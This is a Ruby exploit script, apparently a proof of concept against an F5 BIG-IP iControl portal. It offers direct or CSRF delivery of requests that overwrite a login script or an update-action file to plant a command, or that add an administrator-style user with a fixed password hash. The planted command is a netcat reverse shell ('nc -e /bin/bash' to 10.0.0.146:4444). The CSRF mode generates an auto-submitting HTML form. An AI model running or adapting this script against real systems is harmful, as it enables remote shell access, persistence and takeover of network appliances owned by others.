require 'httparty'
require 'base64'

def usage()
  puts "ruby #{ $0 } <direct|csrf> <login|reboot|adduser>"
  exit
end

COMMAND = "nc -e /bin/bash 10.0.0.146 4444 2>&1 > /dev/null &"
TARGET_URL = 'https://10.0.0.162/iControl/iControlPortal.cgi'
DELAY = 1000

if ARGV[1] == "login"
  # Grabbed from 17.0.0
  ORIGINAL_FILE = Base64::strict_encode64(%{#
# THIS IS AN AUTO-GENERATED FILE - DO NOT EDIT!!!
#
# Use the tmsh shell utility to make changes to the system configuration.
# For more information, see tmsh -a help sys sshd.
PSOUT=`/bin/ps --no-headers -o tty -$$`
if [ "${PSOUT:0:3}" == "tty" ]; then
    export TMOUT=0
else
    export TMOUT=0
fi
})

  TARGET_FILE = "/var/run/config/timeout.sh"
  PAYLOAD = [
    "#!/bin/bash",
    "echo \"#{ ORIGINAL_FILE }\" | base64 -d > \"#{ TARGET_FILE }\"", # Restore the original file at login
    COMMAND, # Run the command
  ].join("\n")

  REQUEST = File.read('upload_file.xml')
      .gsub('%%%FILENAME%%%', TARGET_FILE)
      .gsub('%%%PAYLOAD%%%',  Base64::strict_encode64(PAYLOAD))
elsif ARGV[1] == "reboot"
  TARGET_FILE = "/shared/f5_update_action"
  PAYLOAD = [ "AAA", "https://localhost/success`#{ COMMAND }`", "https://localhost/", 0, 0, 0, 0 ].join("\n")
  REQUEST = File.read('upload_file.xml')
      .gsub('%%%FILENAME%%%', TARGET_FILE)
      .gsub('%%%PAYLOAD%%%',  Base64::strict_encode64(PAYLOAD))
elsif ARGV[1] == "adduser"
  REQUEST = File.read('add_user.xml')
    .gsub('%%%USERNAME%%%', 'rondemo2')
    .gsub('%%%HASH%%%', "$6$rbt6nUSRGCzIzoLX$r2nMhl25L74nu24kubAoztqSFbfadbv6qndI.5mEqZm/V/q/tnF.lRGyeBnjPsrAGx70CdfsvE/uyWbMFpqpt/") # "test"
else
  usage()
end


if ARGV[0] == 'direct'
  puts "Sending: #{ REQUEST }"
  response = HTTParty.post(
    TARGET_URL,
    verify: false,
    headers: {
      authorization: Base64::encode64('admin:iagotestbigip'),
      'content-type': 'text/xml',
    },
    body: REQUEST
  )
  puts
  puts "Response:"
  puts response
  puts
  puts '---'

  if response.body =~ /(error_string.*)/
    puts "Something went wrong, aborting:"
    puts
    puts $1
    exit 1
  end
elsif ARGV[0] == 'csrf'
  puts %{
      <form id="form" method="post" action="#{ TARGET_URL }" enctype="text/plain">
        <textarea id="payload" name="&lt;!--">--&gt;#{ REQUEST }</textarea>
        <input type=submit>
      </form>

      <script>
        setTimeout(function() {
          document.getElementById("form").submit();
        }, #{ DELAY });
      </script>
    }
else
  usage()
end
